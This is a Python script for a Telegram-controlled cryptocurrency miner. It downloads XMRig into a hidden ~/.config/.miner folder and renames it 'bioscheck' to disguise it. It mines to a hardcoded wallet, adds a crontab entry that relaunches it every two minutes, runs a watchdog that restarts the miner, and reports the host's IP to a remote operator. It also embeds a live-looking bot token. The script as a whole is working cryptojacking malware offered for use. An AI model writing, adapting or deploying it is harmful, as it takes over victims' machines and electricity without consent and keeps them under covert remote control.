import os, subprocess, time, socket, requests, threading, telebot, platform
from datetime import datetime

# === CONFIG ===
BOT_TOKEN = '7987532893:AAGvwCj4X83Qr5IFYyk3GeO3synDYR5Xh4Y'
OWNER_ID = 7285391034  # Replace with your Telegram numeric ID
POOL = "fr.zephyr.herominers.com:1123"
WALLET = "ZEPHYR2zxTXUfUEtvhU5QSDjPPBq6XtoU8faeFj3mTEr5hWs5zERHsXT9xc6ivLNMmbbQvxWvGUaxAyyLv3Cnbb9MgemKUED19M2b"
COIN = "zeph"
THREADS = "4"
MINER_NAME = "A0"
MINER_URL = "https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"
BIN_DIR = os.path.expanduser("~/.config/.miner")
MINER_BIN = os.path.join(BIN_DIR, "bioscheck")
LOGFILE = os.path.join(BIN_DIR, "log.txt")

bot = telebot.TeleBot(BOT_TOKEN)
status = {"running": False, "start_time": None}

def run_cmd(cmd):
    try:
        return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
    except Exception as e:
        return str(e)

def install_miner():
    os.makedirs(BIN_DIR, exist_ok=True)
    if not os.path.exists(MINER_BIN):
        archive = os.path.join(BIN_DIR, "xmrig.tar.gz")
        run_cmd(f"wget -qO {archive} {MINER_URL}")
        run_cmd(f"tar -xzf {archive} -C {BIN_DIR}")
        for file in os.listdir(BIN_DIR):
            if "xmrig" in file and os.access(os.path.join(BIN_DIR, file), os.X_OK):
                os.rename(os.path.join(BIN_DIR, file), MINER_BIN)
                break
        os.chmod(MINER_BIN, 0o700)

def start_miner():
    if not status["running"]:
        install_miner()
        cmd = f'{MINER_BIN} -o {POOL} -u {WALLET} -p x -a rx/0 --coin {COIN} -t {THREADS} --tls --donate-level=1'
        with open(LOGFILE, "a") as log:
            subprocess.Popen(cmd.split(), stdout=log, stderr=log)
        status["running"] = True
        status["start_time"] = time.time()

def stop_miner():
    run_cmd(f"pkill -f {MINER_BIN}")
    status["running"] = False
    status["start_time"] = None

def get_speed():
    try:
        output = run_cmd(f"ps aux | grep {MINER_BIN} | grep -v grep")
        if output:
            stat = run_cmd(f"tail -n 30 {LOGFILE}")
            for line in stat.splitlines()[::-1]:
                if "speed" in line.lower():
                    return line.strip()
        return "No hashrate found."
    except:
        return "Error fetching speed."

def get_status():
    uptime = time.time() - status["start_time"] if status["start_time"] else 0
    try:
        ip = requests.get("https://api.ipify.org").text.strip()
    except:
        ip = "Unknown"
    return (
        f"💠 Status\n"
        f"Miner: {'✅ Running' if status['running'] else '❌ Stopped'}\n"
        f"IP: {ip}\n"
        f"Uptime: {int(uptime)//60} mins\n"
        f"Worker: {MINER_NAME}\n"
        f"Threads: {THREADS}\n"
        f"Pool: {POOL}"
    )

def send_start_msg():
    try:
        bot.send_message(OWNER_ID, f"✅ Miner started.\n{get_status()}")
    except Exception as e:
        pass

def send_error_msg(e):
    try:
        bot.send_message(OWNER_ID, f"❌ Error:\n{str(e)}")
    except:
        pass

def setup_persistence():
    cronjob = f"*/2 * * * * python3 {os.path.abspath(__file__)} &\n"
    croncmd = f'(crontab -l 2>/dev/null; echo "{cronjob}") | crontab -'
    run_cmd(croncmd)

def watchdog():
    while True:
        time.sleep(10)
        if status["running"]:
            out = run_cmd(f"pgrep -f {MINER_BIN}")
            if not out.strip():
                start_miner()

@bot.message_handler(commands=['start'])
def cmd_start(message):
    if message.chat.id == OWNER_ID:
        start_miner()
        bot.reply_to(message, "⛏️ Miner started.")

@bot.message_handler(commands=['stop'])
def cmd_stop(message):
    if message.chat.id == OWNER_ID:
        stop_miner()
        bot.reply_to(message, "🛑 Miner stopped.")

@bot.message_handler(commands=['status'])
def cmd_status(message):
    if message.chat.id == OWNER_ID:
        bot.reply_to(message, get_status())

@bot.message_handler(commands=['speed'])
def cmd_speed(message):
    if message.chat.id == OWNER_ID:
        bot.reply_to(message, get_speed())

@bot.message_handler(commands=['log'])
def cmd_log(message):
    if message.chat.id == OWNER_ID:
        try:
            with open(LOGFILE) as f:
                log = f.read()[-3000:]
            bot.reply_to(message, f"📄 Log:\n{log}")
        except:
            bot.reply_to(message, "No log available.")

@bot.message_handler(commands=['setname'])
def cmd_setname(message):
    global MINER_NAME
    if message.chat.id == OWNER_ID:
        try:
            newname = message.text.split(' ')[1]
            MINER_NAME = newname.strip()
            bot.reply_to(message, f"✅ Worker name set to: {MINER_NAME}")
        except:
            bot.reply_to(message, "Usage: /setname <name>")

def bootstrap():
    try:
        setup_persistence()
        threading.Thread(target=watchdog, daemon=True).start()
        send_start_msg()
        bot.polling(non_stop=True)
    except Exception as e:
        send_error_msg(e)

if __name__ == "__main__":
    bootstrap()
